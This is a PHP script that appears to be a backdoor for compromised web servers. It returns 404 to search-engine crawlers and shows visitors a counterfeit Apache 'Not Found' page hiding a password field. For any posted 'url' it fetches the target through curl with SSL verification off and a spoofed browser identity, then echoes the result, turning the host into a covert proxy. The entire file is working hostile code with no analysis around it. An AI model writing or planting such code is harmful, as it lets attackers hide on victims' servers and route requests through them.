<?PHP

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler');
    if (preg_match('/'.implode('|', $userAgents).'/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function buuuu()
{
    die('<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <pre align=center>
    <form method=post>
    <input type=password name=pass>
    </form></pre>');
}

if (!isset($_POST['url']) or empty($_POST['url'])) {
    buuuu();
}
// ############################################################################

$cookie = '';
$ch = curl_init();
$timeout = 5; // set to zero for no timeout

curl_setopt($ch, CURLOPT_URL, $_POST['url']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_REFERER, 'http://www.example.com/');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$file_contents = curl_exec($ch);
curl_close($ch);

// display file
echo $file_contents;
//echo json_decode($file_contents);
